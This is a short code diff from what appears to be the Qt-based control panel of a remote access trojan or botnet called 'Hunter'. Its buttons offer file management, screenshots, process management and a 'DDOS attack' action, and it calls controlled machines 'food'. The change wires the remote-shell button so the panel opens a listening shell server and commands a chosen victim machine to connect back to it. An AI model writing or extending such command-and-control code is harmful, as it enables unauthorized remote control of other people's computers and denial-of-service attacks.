@@ -38,7 +38,7 @@ Hunter::Hunter(QWidget *parent)
     ui->btOffline->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
     // 按钮文字
     ui->btFile->setText("文件\n管理");
-    ui->btShell->setText("远程\ncmd");
+    ui->btShell->setText("远程\nShell");
     ui->btScreen->setText("屏幕\n截图");
     ui->btDDos->setText("DDOS\n攻击");
     ui->btProcess->setText("进程\n管理");
@@ -160,7 +160,15 @@ Hunter::Hunter(QWidget *parent)
 
     // 启动远程shell
     connect(ui->btShell, &QPushButton::clicked, this, [=](){
-        Shell *sh = new Shell();
+        int id = curFoodIdInTbl();
+        if (id != -1){
+            Shell *sh = new Shell();
+            Food *food = mCook->getFoodById(id);
+            int port = sh->startShellServer(QString::number(id));
+
+            // 让食物启动shell
+            food->sendCmdShell(port);
+        }
     });
 
 
